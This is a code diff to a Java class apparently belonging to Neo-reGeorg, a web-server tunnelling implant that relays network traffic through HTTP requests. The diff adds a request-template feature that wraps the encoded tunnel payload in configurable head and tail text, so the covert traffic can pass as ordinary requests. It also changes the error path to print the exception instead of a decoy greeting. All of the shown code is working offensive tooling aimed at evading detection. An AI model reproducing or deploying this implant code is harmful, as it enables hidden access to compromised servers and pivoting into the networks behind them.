@@ -35,6 +35,10 @@ public class NeoreGeorg implements HostnameVerifier, X509TrustManager {
             String GeorgHello = (String)  args[7];
             int BLV_L_OFFSET  = (Integer) args[8];
 
+            int USE_REQUEST_TEMPLATE = (Integer) args[9];
+            int START_INDEX   = (Integer) args[10];
+            int END_INDEX     = (Integer) args[11];
+
             int DATA          = 1;
             int CMD           = 2;
             int MARK          = 3;
@@ -50,6 +54,8 @@ public class NeoreGeorg implements HostnameVerifier, X509TrustManager {
 
             Object[] info  = new Object[40];
             Object[] rinfo = new Object[40];
+            String requestDataHead = "";
+            String requestDataTail = "";
             try {
                 if (((int)(Integer)(invokeMethod(request, "getContentLength", new Object[0]))) != -1) {
                     String inputData = "";
@@ -63,11 +69,19 @@ public class NeoreGeorg implements HostnameVerifier, X509TrustManager {
                             break;
                         inputData += new String(buff);
                     }
+                    if (USE_REQUEST_TEMPLATE == 1) {
+                        requestDataHead = inputData.substring(0, START_INDEX);
+                        requestDataTail = inputData.substring(inputData.length() - END_INDEX, inputData.length());
+
+                        inputData = inputData.substring(START_INDEX);
+                        inputData = inputData.substring(0, inputData.length() - END_INDEX);
+                    }
                     byte[] data = b64de(inputData);
                     info = blv_decode(data, BLV_L_OFFSET);
                 }
             } catch ( Exception e) {
-                out.write(new String(b64de(GeorgHello)));
+                // out.write(new String(b64de(GeorgHello)));
+                out.write(e.toString());
                 out.flush();
                 out.close();
                 return false; // exit
@@ -114,7 +128,7 @@ public class NeoreGeorg implements HostnameVerifier, X509TrustManager {
                             return false;
                         }
 
-                        String newData = b64en(blv_encode(info, BLV_L_OFFSET));
+                        String newData = requestDataHead + b64en(blv_encode(info, BLV_L_OFFSET)) + requestDataTail;
                         byte[] data = newData.getBytes();
                         output.write(data, 0, data.length);
                         output.flush();
